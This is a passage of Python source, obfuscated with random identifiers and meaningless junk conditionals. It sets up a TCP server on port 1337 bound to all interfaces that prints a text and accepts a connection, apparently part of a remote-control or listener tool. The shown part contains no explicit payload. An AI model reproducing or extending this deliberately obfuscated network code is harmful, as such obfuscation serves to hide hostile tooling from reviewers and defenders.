    if cvtueIRURVPRkJZAERFqHEsxXjrnvFiQ != MhFqUxjsIODqjXYBmEvLQsUTaetyuchR:
        qZYJcDbDbjpYBBJxDjBwuOrXvWzkvUhR = hRXFGvdGuNvUTcxQhsgXBLyBnYcuagCY
        for cKqlAVsqTIoXWaXHFnjjWOIdcIBMGWJo in MhFqUxjsIODqjXYBmEvLQsUTaetyuchR:
            if cKqlAVsqTIoXWaXHFnjjWOIdcIBMGWJo != hRXFGvdGuNvUTcxQhsgXBLyBnYcuagCY:
                qZYJcDbDbjpYBBJxDjBwuOrXvWzkvUhR = qZYJcDbDbjpYBBJxDjBwuOrXvWzkvUhR
            else:
                gygUziAbNZrPKkPMFcPiHNQWzWxwDXjQ = cvtueIRURVPRkJZAERFqHEsxXjrnvFiQ
    else:
        hRXFGvdGuNvUTcxQhsgXBLyBnYcuagCY = cvtueIRURVPRkJZAERFqHEsxXjrnvFiQ
        cvtueIRURVPRkJZAERFqHEsxXjrnvFiQ = gygUziAbNZrPKkPMFcPiHNQWzWxwDXjQ
        if hRXFGvdGuNvUTcxQhsgXBLyBnYcuagCY == cvtueIRURVPRkJZAERFqHEsxXjrnvFiQ:
            for cKqlAVsqTIoXWaXHFnjjWOIdcIBMGWJo in cvtueIRURVPRkJZAERFqHEsxXjrnvFiQ:
                if cKqlAVsqTIoXWaXHFnjjWOIdcIBMGWJo == hRXFGvdGuNvUTcxQhsgXBLyBnYcuagCY:
                    hRXFGvdGuNvUTcxQhsgXBLyBnYcuagCY = cvtueIRURVPRkJZAERFqHEsxXjrnvFiQ
                else:
                    hRXFGvdGuNvUTcxQhsgXBLyBnYcuagCY = gygUziAbNZrPKkPMFcPiHNQWzWxwDXjQ
    dCFeAsflpFWIYsKiFMxmNLgRzBQnNutn.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return dCFeAsflpFWIYsKiFMxmNLgRzBQnNutn
def peLcLHBhgzuWqIXCIFmkLiUOYdArvOei():
    onIzuOTQfGlnpXKwyjtyXtYqHpDairql = 'lORyfdCmgZuTyZSbMTWxeEmdvmdLxTzW'
    BZhPOVuVPbNSjJNEMiTGAjHkmQfykSRx = 'SvXiidlXlqurdXGBPhDrAexWgrrqDenk'
    SLLDbTrHQRvhFfKlUxKQmJrbLeGDDPOh = 'YWXZOopAZpdgTWvgLIPvWvllBgjpOzHC'
    if onIzuOTQfGlnpXKwyjtyXtYqHpDairql == BZhPOVuVPbNSjJNEMiTGAjHkmQfykSRx:
        xPWBSgiNfHlNHUmTAHzolZvQQoQDvHSh = 'TsgKFJKqskeSJodnoMzERZEWhfkuetOq'
        xPWBSgiNfHlNHUmTAHzolZvQQoQDvHSh = onIzuOTQfGlnpXKwyjtyXtYqHpDairql
    else:
        xPWBSgiNfHlNHUmTAHzolZvQQoQDvHSh = 'TsgKFJKqskeSJodnoMzERZEWhfkuetOq'
        xPWBSgiNfHlNHUmTAHzolZvQQoQDvHSh = SLLDbTrHQRvhFfKlUxKQmJrbLeGDDPOh
    dCFeAsflpFWIYsKiFMxmNLgRzBQnNutn  = MdEigbPFyJLXCpINmJbNMohglywkLWxa()
    EBEFKCUVYhiVDlullTAQhONSMeMXRkgy = 'QfrTmagNeySCQkfchuUSeDmDPgJKqWut'
    znmsJrTnPhyDyxLadchOhSXOGxpSwWgU = 'mcqbsnlFFGIhaOpbcwILISZcmhSrbdXf'
    LfpSveMfzQXcdmHCnPwHDogIhiqzXfzQ = 'mJHqgCCLlvcCUIbKsQiQIjfohFYRWZHl'
    biPaaEEqYsFazPckqRVVECujvPyqjLbH = 'ydFbvQczcYDCtoTKVkHplgqkzIKyILEB'
    INoneQOnNplLNnlNzJQRkJmmpmjunvUO = 'aIDDZprzBxVfjOVrgyVLZmEEPyEWaFdA'
    gyBUsMpUfeRrbqsmYmByeHxCHYGBLkvY = 'zrJYJkrqlbwvxDCidCuzjutjefSnscaJ'
    if EBEFKCUVYhiVDlullTAQhONSMeMXRkgy != biPaaEEqYsFazPckqRVVECujvPyqjLbH:
        znmsJrTnPhyDyxLadchOhSXOGxpSwWgU = LfpSveMfzQXcdmHCnPwHDogIhiqzXfzQ
        for gyBUsMpUfeRrbqsmYmByeHxCHYGBLkvY in biPaaEEqYsFazPckqRVVECujvPyqjLbH:
            if gyBUsMpUfeRrbqsmYmByeHxCHYGBLkvY != LfpSveMfzQXcdmHCnPwHDogIhiqzXfzQ:
                znmsJrTnPhyDyxLadchOhSXOGxpSwWgU = znmsJrTnPhyDyxLadchOhSXOGxpSwWgU
            else:
                INoneQOnNplLNnlNzJQRkJmmpmjunvUO = EBEFKCUVYhiVDlullTAQhONSMeMXRkgy
    else:
        LfpSveMfzQXcdmHCnPwHDogIhiqzXfzQ = EBEFKCUVYhiVDlullTAQhONSMeMXRkgy
        EBEFKCUVYhiVDlullTAQhONSMeMXRkgy = INoneQOnNplLNnlNzJQRkJmmpmjunvUO
        if LfpSveMfzQXcdmHCnPwHDogIhiqzXfzQ == EBEFKCUVYhiVDlullTAQhONSMeMXRkgy:
            for gyBUsMpUfeRrbqsmYmByeHxCHYGBLkvY in EBEFKCUVYhiVDlullTAQhONSMeMXRkgy:
                if gyBUsMpUfeRrbqsmYmByeHxCHYGBLkvY == LfpSveMfzQXcdmHCnPwHDogIhiqzXfzQ:
                    LfpSveMfzQXcdmHCnPwHDogIhiqzXfzQ = EBEFKCUVYhiVDlullTAQhONSMeMXRkgy
                else:
                    LfpSveMfzQXcdmHCnPwHDogIhiqzXfzQ = INoneQOnNplLNnlNzJQRkJmmpmjunvUO
    aBEaBmqsDCmxwKIuXZmDCZvewrFOrWKa    = vars(dCFeAsflpFWIYsKiFMxmNLgRzBQnNutn.parse_args())
    RNYmneygEvQQpxwwtOzfgAgdFlPKTgYf = 'dYtFateQrpZBgWFKYSWIRRElKwWVgZWs'
    AFBGcgidvAfdQkuQcxFFIIbFqVFMdEnU = 'vnBGYQKvazrDCnMjCUBxQswDxpmFqmae'
    if RNYmneygEvQQpxwwtOzfgAgdFlPKTgYf != AFBGcgidvAfdQkuQcxFFIIbFqVFMdEnU:
        eaOVKYYUwPyXaJUOwSYxbSVcQslluZUN = 'klrMtYhychaSkDPJPCTClyguZEEbQveA'
        SKIMNtOnnggtzrzAoPwkQYONddxFPygc = 'LYnGESjapOvLpOnFQLHdgWOqgvHLJbtx'
        SKIMNtOnnggtzrzAoPwkQYONddxFPygc = eaOVKYYUwPyXaJUOwSYxbSVcQslluZUN
    wnePIElTvQvjdFKXyZQgTpHdBXJmudaI    = aBEaBmqsDCmxwKIuXZmDCZvewrFOrWKa['port']
    ciPqWZGjdjiFwMNuNSVZsFxRicALivKe = 'IoQbxaUelyyzxNLFcejVaPSrRdqqaWPt'
    LvansfyGvCeaMcTBlGOrlrlcaaDSBfXX = 'uaIoQYRdRCTWDfZyPrIXrqAqkrqIwJgB'
    jPxYqOKinlKhibjDqcxjtxdtfELweltf = 'AJSiqErqKtzwVRCEyLWJaqbDtcBMzWdL'
    RREKBsvolXOXQkBDSIRYawLwrYNZCAXn = 'cOIGVqiBIJFqtsokOsFHmCYZkFMRhcEk'
    azJUZbhnsOFPDzIlTTpvjESBvNFhtrln = 'LGdARpaDvVnxOlHCSPOBEJhvVKZxAVjs'
    uKzhDfcuRFwVedzBMNwyPWDAloroOcdf = 'GeuJSLyYYxXgPoebUsIIyQuDJfHFvikN'
    if jPxYqOKinlKhibjDqcxjtxdtfELweltf == RREKBsvolXOXQkBDSIRYawLwrYNZCAXn:
        for uKzhDfcuRFwVedzBMNwyPWDAloroOcdf in azJUZbhnsOFPDzIlTTpvjESBvNFhtrln:
            if uKzhDfcuRFwVedzBMNwyPWDAloroOcdf == RREKBsvolXOXQkBDSIRYawLwrYNZCAXn:
                azJUZbhnsOFPDzIlTTpvjESBvNFhtrln = ciPqWZGjdjiFwMNuNSVZsFxRicALivKe
            else:
                RREKBsvolXOXQkBDSIRYawLwrYNZCAXn = LvansfyGvCeaMcTBlGOrlrlcaaDSBfXX
    NnAHEyzstOAhyDIxNvEBiZNNgIEkjaKT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ROMCJXcHnZWhswRUFYsMuzhuKSqoKIOd = 'CslKkDDLaysjbavzulISWoYWXrAmCDvi'
    qLrOFsqfaelWqYHBWnsiZqecNjvSEHkV = 'KXPSiDORntPqzVzXMYeSnQvdbkngwFEU'
    niSZDewSLeMYMfdyPrHCEgvogxJZPxlu = 'jgVhDEXYYfKSFyupxckIPTfGUHdvWyFK'
    nbbQQRGyiXZHRCbuqnUvcaSFUPPPmgiV = 'VTxkUDWoxsnOHUVIgThTTDVFJBoDRABk'
    ZQCyySgAIIeZkyqkfJWnnXCRLALBnAmG = 'EJsRVSoPbxzSmmrPhPUkIVlKITkURvFj'
    zHRLksTpPszUUjJbhvRollAhEodlnSIZ = 'UWbHlyrbImTdEmoBQsArIDFbUNjojQpD'
    if ROMCJXcHnZWhswRUFYsMuzhuKSqoKIOd != nbbQQRGyiXZHRCbuqnUvcaSFUPPPmgiV:
        qLrOFsqfaelWqYHBWnsiZqecNjvSEHkV = niSZDewSLeMYMfdyPrHCEgvogxJZPxlu
        for zHRLksTpPszUUjJbhvRollAhEodlnSIZ in nbbQQRGyiXZHRCbuqnUvcaSFUPPPmgiV:
            if zHRLksTpPszUUjJbhvRollAhEodlnSIZ != niSZDewSLeMYMfdyPrHCEgvogxJZPxlu:
                qLrOFsqfaelWqYHBWnsiZqecNjvSEHkV = qLrOFsqfaelWqYHBWnsiZqecNjvSEHkV
            else:
                ZQCyySgAIIeZkyqkfJWnnXCRLALBnAmG = ROMCJXcHnZWhswRUFYsMuzhuKSqoKIOd
    else:
        niSZDewSLeMYMfdyPrHCEgvogxJZPxlu = ROMCJXcHnZWhswRUFYsMuzhuKSqoKIOd
        ROMCJXcHnZWhswRUFYsMuzhuKSqoKIOd = ZQCyySgAIIeZkyqkfJWnnXCRLALBnAmG
        if niSZDewSLeMYMfdyPrHCEgvogxJZPxlu == ROMCJXcHnZWhswRUFYsMuzhuKSqoKIOd:
            for zHRLksTpPszUUjJbhvRollAhEodlnSIZ in ROMCJXcHnZWhswRUFYsMuzhuKSqoKIOd:
                if zHRLksTpPszUUjJbhvRollAhEodlnSIZ == niSZDewSLeMYMfdyPrHCEgvogxJZPxlu:
                    niSZDewSLeMYMfdyPrHCEgvogxJZPxlu = ROMCJXcHnZWhswRUFYsMuzhuKSqoKIOd
                else:
                    niSZDewSLeMYMfdyPrHCEgvogxJZPxlu = ZQCyySgAIIeZkyqkfJWnnXCRLALBnAmG
    try:
        cyrUDTbwOCgUkkLoiIGuaBKUyKzxNicE = 'KPzHoUfPKPZnkAatpqtlhXUXJEVavMaE'
        qUnCAfziTsesSmVrnbFUcxwASdpwYTwK = 'nXVcbfWqzipxOtSWszCCXSBCflMZXesx'
        DzFjEhsEnKkhRUYqXgxlcXZJBpzFZBFE = 'OEEIaPshiygqxkSdCBGdClCNpILTfIhg'
        gmKuwOlXPyMDyyRRtqVwKFqzAQCDVbHM = 'hvFbCCOdtuEkPvPWHGfhQLlgfcGyDTXI'
        wYWSRfZoBmQQrSCSspnreTUMJTjThpNL = 'DasJEWpFGUJVHnSHlliCMvVfdcJiKQuC'
        PcYQVkZNcDSuANYkEQTuKEYdvlJItnFD = 'VlRXBiJJnqIjjKCNYkcmSnhOVxtCwRcb'
        if DzFjEhsEnKkhRUYqXgxlcXZJBpzFZBFE == gmKuwOlXPyMDyyRRtqVwKFqzAQCDVbHM:
            for PcYQVkZNcDSuANYkEQTuKEYdvlJItnFD in wYWSRfZoBmQQrSCSspnreTUMJTjThpNL:
                if PcYQVkZNcDSuANYkEQTuKEYdvlJItnFD == gmKuwOlXPyMDyyRRtqVwKFqzAQCDVbHM:
                    wYWSRfZoBmQQrSCSspnreTUMJTjThpNL = cyrUDTbwOCgUkkLoiIGuaBKUyKzxNicE
                else:
                    gmKuwOlXPyMDyyRRtqVwKFqzAQCDVbHM = qUnCAfziTsesSmVrnbFUcxwASdpwYTwK
        NnAHEyzstOAhyDIxNvEBiZNNgIEkjaKT.bind(('0.0.0.0', wnePIElTvQvjdFKXyZQgTpHdBXJmudaI))
        UaJswoHAzsNRspTEjgRSpBdSzNpgocqB = 'AxyyvOXLrMDarcZxQKkyPscKrwuudeIb'
        IOOvTyEtbsxgoELidUXsKUXeHOOsEoef = 'ZeNJpVgXOBCFQxzvCxjuodkWFOzQRtau'
        ullgBTbRkHvXqqHZALtjMLBbNnnIqWwj = 'wdYjCIsjzuoUiHBZOKzEMZODxlPlokkm'
        xLwlKyERxMMBZAHcIRASoBFRJSpRbsgY = 'TChTbKktrFdSXlewIIOUdnZQAdEIBdvw'
        UBLqvnxDobHYFnTEHuxBLsjeWXoyJhjD = 'JElRyTlGCzDOhwSsyUwvSCmyTOCamJNq'
        EgKkwfNSMZBtTttraMAaCZzNkbNIpXFh = 'mjePgswEuTJxRMxOcCsACSxuBlXvEnOh'
        if UaJswoHAzsNRspTEjgRSpBdSzNpgocqB != xLwlKyERxMMBZAHcIRASoBFRJSpRbsgY:
            IOOvTyEtbsxgoELidUXsKUXeHOOsEoef = ullgBTbRkHvXqqHZALtjMLBbNnnIqWwj
            for EgKkwfNSMZBtTttraMAaCZzNkbNIpXFh in xLwlKyERxMMBZAHcIRASoBFRJSpRbsgY:
                if EgKkwfNSMZBtTttraMAaCZzNkbNIpXFh != ullgBTbRkHvXqqHZALtjMLBbNnnIqWwj:
                    IOOvTyEtbsxgoELidUXsKUXeHOOsEoef = IOOvTyEtbsxgoELidUXsKUXeHOOsEoef
                else:
                    UBLqvnxDobHYFnTEHuxBLsjeWXoyJhjD = UaJswoHAzsNRspTEjgRSpBdSzNpgocqB
        else:
            ullgBTbRkHvXqqHZALtjMLBbNnnIqWwj = UaJswoHAzsNRspTEjgRSpBdSzNpgocqB
            UaJswoHAzsNRspTEjgRSpBdSzNpgocqB = UBLqvnxDobHYFnTEHuxBLsjeWXoyJhjD
            if ullgBTbRkHvXqqHZALtjMLBbNnnIqWwj == UaJswoHAzsNRspTEjgRSpBdSzNpgocqB:
                for EgKkwfNSMZBtTttraMAaCZzNkbNIpXFh in UaJswoHAzsNRspTEjgRSpBdSzNpgocqB:
                    if EgKkwfNSMZBtTttraMAaCZzNkbNIpXFh == ullgBTbRkHvXqqHZALtjMLBbNnnIqWwj:
                        ullgBTbRkHvXqqHZALtjMLBbNnnIqWwj = UaJswoHAzsNRspTEjgRSpBdSzNpgocqB
                    else:
                        ullgBTbRkHvXqqHZALtjMLBbNnnIqWwj = UBLqvnxDobHYFnTEHuxBLsjeWXoyJhjD
    except socket.error:
        helSzTcYAizomynmxuhZKJbJkASJpDlN = 'FazDLWicWNLqhemNOCNiyoZUusAZsRPl'
        CqBPhVAsRoezozSsbVGNFWzqVxwBakjI = 'vXyzpaqbYRWkNQULRYUqjYoFSEumpsPW'
        EbFQExAvpRpsiPLoiVsqQafIbNgorXrJ = 'yUeJpuDjZPuYWfySDQCsOyBDdzMfhKPJ'
        dVgnyMggHIAJXwNLddzTjodoAxcEtefx = 'TVZLUwRUndmTDbqPaEJjNKLQxALAVSBr'
        MoqBPvnvVOubRjsPVvdNZNtzCXPzigKM = 'SqoOEkIpmJVkwvzWBZajerOUEWloWlmu'
        ZrLGlpZmopbKmiOKjzoKZoUyWIlcnuiX = 'uYcsIPxkwmCQqgHbxJjXaiFQpfqBVYjE'
        if helSzTcYAizomynmxuhZKJbJkASJpDlN != dVgnyMggHIAJXwNLddzTjodoAxcEtefx:
            CqBPhVAsRoezozSsbVGNFWzqVxwBakjI = EbFQExAvpRpsiPLoiVsqQafIbNgorXrJ
            for ZrLGlpZmopbKmiOKjzoKZoUyWIlcnuiX in dVgnyMggHIAJXwNLddzTjodoAxcEtefx:
                if ZrLGlpZmopbKmiOKjzoKZoUyWIlcnuiX != EbFQExAvpRpsiPLoiVsqQafIbNgorXrJ:
                    CqBPhVAsRoezozSsbVGNFWzqVxwBakjI = CqBPhVAsRoezozSsbVGNFWzqVxwBakjI
                else:
                    MoqBPvnvVOubRjsPVvdNZNtzCXPzigKM = helSzTcYAizomynmxuhZKJbJkASJpDlN
        else:
            EbFQExAvpRpsiPLoiVsqQafIbNgorXrJ = helSzTcYAizomynmxuhZKJbJkASJpDlN
            helSzTcYAizomynmxuhZKJbJkASJpDlN = MoqBPvnvVOubRjsPVvdNZNtzCXPzigKM
            if EbFQExAvpRpsiPLoiVsqQafIbNgorXrJ == helSzTcYAizomynmxuhZKJbJkASJpDlN:
                for ZrLGlpZmopbKmiOKjzoKZoUyWIlcnuiX in helSzTcYAizomynmxuhZKJbJkASJpDlN:
                    if ZrLGlpZmopbKmiOKjzoKZoUyWIlcnuiX == EbFQExAvpRpsiPLoiVsqQafIbNgorXrJ:
                        EbFQExAvpRpsiPLoiVsqQafIbNgorXrJ = helSzTcYAizomynmxuhZKJbJkASJpDlN
                    else:
                        EbFQExAvpRpsiPLoiVsqQafIbNgorXrJ = MoqBPvnvVOubRjsPVvdNZNtzCXPzigKM
        sys.exit(1)
        NscMMyNGiHNCaheJfpnDgdnMNPEhOiPH = 'fjGURXeWybeYPaTwpngxEoNtyEGQqshE'
        qJvHtnoBYsvGmVuZbsHZqZkeJtDryfdd = 'nSiQFbKMVEFOnLrZCXvpokLkFwyOZJQX'
        LXrupJhggtceLdwkNatbRuLwtkRvYUDv = 'jBIdWWydTIJsNrJZFEFCfhUYvFfHlIHZ'
        iJGkpJIGNIMULlXYduuwLXrignDgkvCn = 'PkoSKegxLicVVlAmNuJKisUntrSUwkka'
        pXeufYXZFiTgeoqifeswmSVDSaGGZiFt = 'EmxUgypNWWUlNYjOsRfsXVNDdhhMWaVn'
        hZLQCfcBVCcEQaMNqwgqAxfxBwGCqMzo = 'XPfYJPpckHJNWBltTKdjRKeAxCeKZOTu'
        if NscMMyNGiHNCaheJfpnDgdnMNPEhOiPH != iJGkpJIGNIMULlXYduuwLXrignDgkvCn:
            qJvHtnoBYsvGmVuZbsHZqZkeJtDryfdd = LXrupJhggtceLdwkNatbRuLwtkRvYUDv
            for hZLQCfcBVCcEQaMNqwgqAxfxBwGCqMzo in iJGkpJIGNIMULlXYduuwLXrignDgkvCn:
                if hZLQCfcBVCcEQaMNqwgqAxfxBwGCqMzo != LXrupJhggtceLdwkNatbRuLwtkRvYUDv:
                    qJvHtnoBYsvGmVuZbsHZqZkeJtDryfdd = qJvHtnoBYsvGmVuZbsHZqZkeJtDryfdd
                else:
                    pXeufYXZFiTgeoqifeswmSVDSaGGZiFt = NscMMyNGiHNCaheJfpnDgdnMNPEhOiPH
        else:
            LXrupJhggtceLdwkNatbRuLwtkRvYUDv = NscMMyNGiHNCaheJfpnDgdnMNPEhOiPH
            NscMMyNGiHNCaheJfpnDgdnMNPEhOiPH = pXeufYXZFiTgeoqifeswmSVDSaGGZiFt
            if LXrupJhggtceLdwkNatbRuLwtkRvYUDv == NscMMyNGiHNCaheJfpnDgdnMNPEhOiPH:
                for hZLQCfcBVCcEQaMNqwgqAxfxBwGCqMzo in NscMMyNGiHNCaheJfpnDgdnMNPEhOiPH:
                    if hZLQCfcBVCcEQaMNqwgqAxfxBwGCqMzo == LXrupJhggtceLdwkNatbRuLwtkRvYUDv:
                        LXrupJhggtceLdwkNatbRuLwtkRvYUDv = NscMMyNGiHNCaheJfpnDgdnMNPEhOiPH
                    else:
                        LXrupJhggtceLdwkNatbRuLwtkRvYUDv = pXeufYXZFiTgeoqifeswmSVDSaGGZiFt
    for hdGVfRvVrNvVzPRIvIjiSmMsXnaHKWHy in HrfWznprFGdIdSXLPsrjNgKLvtsWEdNq.split('\n'):
        jfhgQLUvrAJDYBrWWAtCaGAfzeEozQMp = 'siDQmmgHuDQCfTahyNKuviWkbBUskoeL'
        JlWKCEKWALlplbGpdBNblndbWkxWkbBB = 'AZgVPoNYqyXJTTRNvFkbHsWGICgtSUti'
        xdjGYWNftZeFVcbUBWSdrgAiWnwdOqAP = 'JUrOxRekGzgiWhlUjeTRJOoBFZKjsSJV'
        hCDwAXVcUdAHFOpLGAzbKaNpUHLscGgI = 'DtfMjTlcWDDpVcEaegXqYOICBwBUXnQY'
        vwgZTgWiFCiHyfsllVGxLGdmduDjhznZ = 'VkjaiAFwxIkHLKloiMRoisGAfHiFAyHM'
        if jfhgQLUvrAJDYBrWWAtCaGAfzeEozQMp in JlWKCEKWALlplbGpdBNblndbWkxWkbBB:
            jfhgQLUvrAJDYBrWWAtCaGAfzeEozQMp = vwgZTgWiFCiHyfsllVGxLGdmduDjhznZ
            if JlWKCEKWALlplbGpdBNblndbWkxWkbBB in xdjGYWNftZeFVcbUBWSdrgAiWnwdOqAP:
                JlWKCEKWALlplbGpdBNblndbWkxWkbBB = hCDwAXVcUdAHFOpLGAzbKaNpUHLscGgI
        elif JlWKCEKWALlplbGpdBNblndbWkxWkbBB in jfhgQLUvrAJDYBrWWAtCaGAfzeEozQMp:
            xdjGYWNftZeFVcbUBWSdrgAiWnwdOqAP = JlWKCEKWALlplbGpdBNblndbWkxWkbBB
            if xdjGYWNftZeFVcbUBWSdrgAiWnwdOqAP in JlWKCEKWALlplbGpdBNblndbWkxWkbBB:
                JlWKCEKWALlplbGpdBNblndbWkxWkbBB = vwgZTgWiFCiHyfsllVGxLGdmduDjhznZ
        time.sleep(0.05)
        HaFpDQAkQBZxGUELKwlfrXWBloHxZqIK = 'mNqgTqHEqDsVOOVmSmzVOjjEAWItZSrT'
        tZHJVFHjLiDRDYOFWgIJXtyOZhOjwwtq = 'wdhCMdJbEMmtTHDfKSKRNQiWKIowGxPF'
        iemVIrRrRaWUDicnNCpyaNnyGtkJuMpd = 'ICyBNMpBbwthHmEjSEtHZAtWabmTuWMS'
        if HaFpDQAkQBZxGUELKwlfrXWBloHxZqIK == tZHJVFHjLiDRDYOFWgIJXtyOZhOjwwtq:
            yBhZJsVzUhpsphQAHjAOckXfFctRBqPK = 'acvJFMdMVpiQTLixeaFUfbUxgxgemmaa'
            yBhZJsVzUhpsphQAHjAOckXfFctRBqPK = HaFpDQAkQBZxGUELKwlfrXWBloHxZqIK
        else:
            yBhZJsVzUhpsphQAHjAOckXfFctRBqPK = 'acvJFMdMVpiQTLixeaFUfbUxgxgemmaa'
            yBhZJsVzUhpsphQAHjAOckXfFctRBqPK = iemVIrRrRaWUDicnNCpyaNnyGtkJuMpd
        XtbeuPWfDltsdrpEuXuTkpOGpRHsnYjP = 'wYQyRwueVKmCBIKVTVRTYTfeqWymXUnM'
        BnJbTREIXRwGflXDfSqAAICRIkrcGDYb = 'cPTGllpvmTvuqGmQNlKylKejfyyHpOqu'
        KckxEuqythHdbmrjUTtYggfWsClaqjYT = 'IKXInOjAfcFGdGyjCvxeIMRAFnOOWUwD'
        bpslBfZfQbjJdsQObLnmHCuBKNjzfUWj = 'PIZYKnAhrefvkPpjLpOFFitstZDcoOZc'
        zpXCwTpBYrYtntotorsjdQmhrJAhyKXF = 'cAAGBGZsWQUCSuqzDknjbMSnqyUIRuin'
        if XtbeuPWfDltsdrpEuXuTkpOGpRHsnYjP in BnJbTREIXRwGflXDfSqAAICRIkrcGDYb:
            XtbeuPWfDltsdrpEuXuTkpOGpRHsnYjP = zpXCwTpBYrYtntotorsjdQmhrJAhyKXF
            if BnJbTREIXRwGflXDfSqAAICRIkrcGDYb in KckxEuqythHdbmrjUTtYggfWsClaqjYT:
                BnJbTREIXRwGflXDfSqAAICRIkrcGDYb = bpslBfZfQbjJdsQObLnmHCuBKNjzfUWj
        elif BnJbTREIXRwGflXDfSqAAICRIkrcGDYb in XtbeuPWfDltsdrpEuXuTkpOGpRHsnYjP:
            KckxEuqythHdbmrjUTtYggfWsClaqjYT = BnJbTREIXRwGflXDfSqAAICRIkrcGDYb
            if KckxEuqythHdbmrjUTtYggfWsClaqjYT in BnJbTREIXRwGflXDfSqAAICRIkrcGDYb:
                BnJbTREIXRwGflXDfSqAAICRIkrcGDYb = zpXCwTpBYrYtntotorsjdQmhrJAhyKXF
    gugunPwKqtmrOHcUEzSBgQhKIYSeLSxn = 'bFqfrJFSxhCWoCXMJaJJBdjGPqBaHWxx'
    tUGvOwAlcWIBegbXAuATVMYUoHBwiLNP = 'eYKRMowykaBRasihZKUEdwVfeTrCHnRF'
    NxENUrxXVBNCtqmqSDXiCVGvBRvdYEwz = 'BYPTyXqDaMYyFPVaSsjrNdBrEFyEpBxb'
    AvoojakKQVHQNfQpKNPAndcvIFACzpoa = 'wznZjjRplcmsvImbXqyfjbuMJTztxEEb'
    UERhWURnipWwxmOgjQHheTdvMkKyGDJv = 'jYCXUqwbjGFFOUaLyosUJwGgFjltSPeN'
    cKubzysqKJiejlkGdeDBMaLgzlAPmmjq = 'mgrpZTDdehcfnXoLviTAKGDpJFHBharA'
    if NxENUrxXVBNCtqmqSDXiCVGvBRvdYEwz == AvoojakKQVHQNfQpKNPAndcvIFACzpoa:
        for cKubzysqKJiejlkGdeDBMaLgzlAPmmjq in UERhWURnipWwxmOgjQHheTdvMkKyGDJv:
            if cKubzysqKJiejlkGdeDBMaLgzlAPmmjq == AvoojakKQVHQNfQpKNPAndcvIFACzpoa:
                UERhWURnipWwxmOgjQHheTdvMkKyGDJv = gugunPwKqtmrOHcUEzSBgQhKIYSeLSxn
            else:
                AvoojakKQVHQNfQpKNPAndcvIFACzpoa = tUGvOwAlcWIBegbXAuATVMYUoHBwiLNP
    NnAHEyzstOAhyDIxNvEBiZNNgIEkjaKT.listen(10)
    VEWmIaxOLDxFugQsGkbRNesuZpgQctQE = 'CbTSeVpGRtlgbJlBWQYVfqAgnPRfctCx'
    ZqhxchtnhQkiULHoyTRQhvXMhwAsxAas = 'rRHZdvehHvblmUDKgiwgbafWglVHpDad'
    nZjpvYbeMbZBEsNiJlwcDPoBYQjchIOS = 'qKZPgBrCScTfOXPmNTAvoIJDxKMxsAUN'
    hfCUmKyoJRswiLmFwGzPNPMCDHRDMZOt = 'qHlKTFZLFeIPSqDFZRQzQsKjFBaingZt'
    XPgqJEOaPBDMPKODXEHUsbNaXWQxmxZy = 'pAwhlkpRuyYsOcZYiCZBHjYkwHUJISkG'
    if VEWmIaxOLDxFugQsGkbRNesuZpgQctQE in ZqhxchtnhQkiULHoyTRQhvXMhwAsxAas:
        VEWmIaxOLDxFugQsGkbRNesuZpgQctQE = XPgqJEOaPBDMPKODXEHUsbNaXWQxmxZy
        if ZqhxchtnhQkiULHoyTRQhvXMhwAsxAas in nZjpvYbeMbZBEsNiJlwcDPoBYQjchIOS:
            ZqhxchtnhQkiULHoyTRQhvXMhwAsxAas = hfCUmKyoJRswiLmFwGzPNPMCDHRDMZOt
    elif ZqhxchtnhQkiULHoyTRQhvXMhwAsxAas in VEWmIaxOLDxFugQsGkbRNesuZpgQctQE:
        nZjpvYbeMbZBEsNiJlwcDPoBYQjchIOS = ZqhxchtnhQkiULHoyTRQhvXMhwAsxAas
        if nZjpvYbeMbZBEsNiJlwcDPoBYQjchIOS in ZqhxchtnhQkiULHoyTRQhvXMhwAsxAas:
            ZqhxchtnhQkiULHoyTRQhvXMhwAsxAas = XPgqJEOaPBDMPKODXEHUsbNaXWQxmxZy
    uoSImEUVWuLEVHmZeVLOwrcJSQoHkjAB, IHFAGJXyRnwrpssXeFglUsxTJUDWGzur = NnAHEyzstOAhyDIxNvEBiZNNgIEkjaKT.accept()
    MrbiHRvXyGaSjbMDgmDAnfebZLpyqpzF = 'zlCPmYsOUqHNmNeygkonRwrkLUzDwCQL'
    PorOsCwoBwAmlbJtIEAElohdchQjcIfk = 'NWvLAJNDJSXCKmSdYmdhrIKhqaPLsAgP'
    CmvNVNqUvAWwUjsqPAGnjljHqULPSmtA = 'EurDwqTuhUTlbeuBapBLSOyJxbAurtlX'
    PZTtkJZrNjpFPsKosWEkkngTNUoNovRX = 'vdmRdPqsoTeSJsvmnbUVWWGZmUILjrhl'
    IXTBDWJejMGHTTKMrMhPMOMkETnisxtT = 'QbypHHdRXPgaoTbPoOualuUjKjtuIRpR'
    tpZoHBYIQYpSQLWrKHSgNlLetZZWDOxm = 'KbTftKVGuryMAcXVmUVURzXUMapiShjB'
    if MrbiHRvXyGaSjbMDgmDAnfebZLpyqpzF != PZTtkJZrNjpFPsKosWEkkngTNUoNovRX:
        PorOsCwoBwAmlbJtIEAElohdchQjcIfk = CmvNVNqUvAWwUjsqPAGnjljHqULPSmtA
        for tpZoHBYIQYpSQLWrKHSgNlLetZZWDOxm in PZTtkJZrNjpFPsKosWEkkngTNUoNovRX:
            if tpZoHBYIQYpSQLWrKHSgNlLetZZWDOxm != CmvNVNqUvAWwUjsqPAGnjljHqULPSmtA:
                PorOsCwoBwAmlbJtIEAElohdchQjcIfk = PorOsCwoBwAmlbJtIEAElohdchQjcIfk
            else:
                IXTBDWJejMGHTTKMrMhPMOMkETnisxtT = MrbiHRvXyGaSjbMDgmDAnfebZLpyqpzF
    else:
        CmvNVNqUvAWwUjsqPAGnjljHqULPSmtA = MrbiHRvXyGaSjbMDgmDAnfebZLpyqpzF
        MrbiHRvXyGaSjbMDgmDAnfebZLpyqpzF = IXTBDWJejMGHTTKMrMhPMOMkETnisxtT
        if CmvNVNqUvAWwUjsqPAGnjljHqULPSmtA == MrbiHRvXyGaSjbMDgmDAnfebZLpyqpzF:
            for tpZoHBYIQYpSQLWrKHSgNlLetZZWDOxm in MrbiHRvXyGaSjbMDgmDAnfebZLpyqpzF:
                if tpZoHBYIQYpSQLWrKHSgNlLetZZWDOxm == CmvNVNqUvAWwUjsqPAGnjljHqULPSmtA:
                    CmvNVNqUvAWwUjsqPAGnjljHqULPSmtA = MrbiHRvXyGaSjbMDgmDAnfebZLpyqpzF
                else:
